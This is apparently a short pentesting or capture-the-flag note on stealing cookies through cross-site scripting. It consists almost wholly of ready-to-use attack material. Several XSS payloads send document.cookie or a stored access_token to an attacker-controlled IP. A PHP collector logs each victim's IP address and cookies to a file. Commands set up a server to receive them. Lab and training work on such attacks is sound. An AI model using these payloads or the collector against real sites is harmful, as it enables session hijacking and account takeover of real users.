JavaScript payloads to try:
```javascript
document.location='http://10.10.15.64:80/index.php?c='+document.cookie;
new Image().src='http://10.10.15.64:8000/index.php?c='+document.cookie;

<script>document.location='http://10.10.15.64:00/XSS/index.php?c='+document.cookie</script>

<script>document.location='http://10.10.15.64:00/XSS/index.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src="http://10.10.15.64:80/index.php?c="+document.cookie;</script>

<script>new Image().src="http://10.10.15.64:80/index.php?c="+localStorage.getItem('access_token');</script>
```

index.html code:
```html
<script src=http://10.10.15.64:80/script.js></script>
```

index.php script:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

host a php server and move all the files to it (index.php, index.html, script.js)
```session
mkdir /tmp/tmpserver 
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

![[Pasted image 20240816222201.png]]
